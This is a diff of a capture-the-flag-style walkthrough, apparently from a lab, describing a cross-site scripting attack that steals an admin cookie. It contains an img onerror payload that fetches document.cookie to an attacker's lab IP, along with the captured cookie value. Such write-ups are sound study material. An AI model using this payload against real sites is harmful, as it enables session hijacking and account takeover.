@@ -48,6 +48,7 @@ Which means we can steal the cookies of other users
 - We need to set up a python server to catch the GET request which should have an (admin) cookie attached to it
 
 - Using the payload:
+
 ```java
 <img src=x onerror=fetch('http://10.10.14.23/?c='+document.cookie);>
 
@@ -60,10 +61,10 @@ and entering **hello;\<script\>** in the **message field** so that it errors. (A
 
 ![image7](../resources/6dc6a636156e4161a6e30a89e8050121.png)
 
-- Got the cookie:
+- Got the cookie:  
 is_admin= **ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0**
 
-- Good article here:
+- Good article here:  
 <https://systemweakness.com/reflected-xss-user-agent-2868ca1d5116>
 
 - In the browser, Inspect -\> Storage -\> Cookies
